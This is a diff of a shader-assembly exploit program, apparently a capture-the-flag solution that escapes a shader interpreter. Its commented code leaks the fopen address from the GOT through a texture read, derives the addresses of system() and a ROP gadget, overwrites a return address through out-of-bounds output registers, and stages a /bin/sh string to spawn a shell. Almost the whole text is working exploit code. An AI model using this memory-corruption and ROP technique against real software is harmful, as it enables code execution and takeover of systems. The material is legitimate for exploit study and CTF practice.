@@ -5,10 +5,15 @@ ret
 
 mov r30.x r30.y
 
-mov o325.xy o4.xy 	/* pState.textures[ 0 ] = &psRegs.CR[ 0 ] */
+mov o579.xy o4.xy 	/* pState.textures[ 0 ] = &psRegs.CR[ 0 ] */
 seti c0.zw 2 1		/* textures[ 0 ] width = 2 height = 1 */
 
-seti c0.x 6394272
+/*
+402480:	ff 25 32 6d 21 00    	jmp    QWORD PTR [rip+0x216d32]        # 6191b8 <fopen@GLIBC_2.2.5>
+0x6191b8 = 6394296
+it is address of memory with address of fopen
+*/
+seti c0.x 6394296
 
 set r10.xyzw 0.0 0.0 1.0 0.0
 tfetch r0.xyzw r10.xy t0 /* read address of fopen */
@@ -29,17 +34,17 @@ or r1.x r1.x r1.w
 mov r0.y r1.x 		/* r0 - fopen addr */
 
 /* calc system addr */
-seti r10.x 164208
+seti r10.x 164208	/* <fopen addr> - <system addr> */
 mov r1.xy r0.xy
 subi r1.x r1.x r10.x /* r1 - system addr */
 
 /* calc gadget addr */
-seti r10.x 529723
+seti r10.x 529723	/* <gadget addr> - <fopen addr> */
 mov r2.xy r0.xy
 addi r2.x r2.x r10.x /* r2 - gadget addr */
 
-mov o26.zw r2.xy /* overwrite return address, so will jump to gadget */
-mov o27.xy r1.xy /* pop rax in gadget will write system addr to rax */
+mov o282.zw r2.xy /* overwrite return address, so will jump to gadget */
+mov o283.xy r1.xy /* pop rax in gadget will write system addr to rax */
 
 /* prepare /bin/sh string */
 /* seti c0.xy 1852400175 6845231 */
@@ -52,6 +57,10 @@ seti c3.xyzw 1734439535 1633955429 641605748 1042294581
 seti c4.xyzw 1701344032 540765292 1752392034 1701344032 
 seti c5.xyzw 27756 0 0 0
 
-mov o27.zw o4.xy /* pop rdi in gadget will write address of c0( ie. string ) to rdi */
+mov o283.zw o4.xy /* pop rdi in gadget will write address of c0( ie. string ) to rdi */
+
+/* raise exception to avoid seg fault */
+seti r0.x 0
+divi r0.x r0.x r0.x
 
 ret
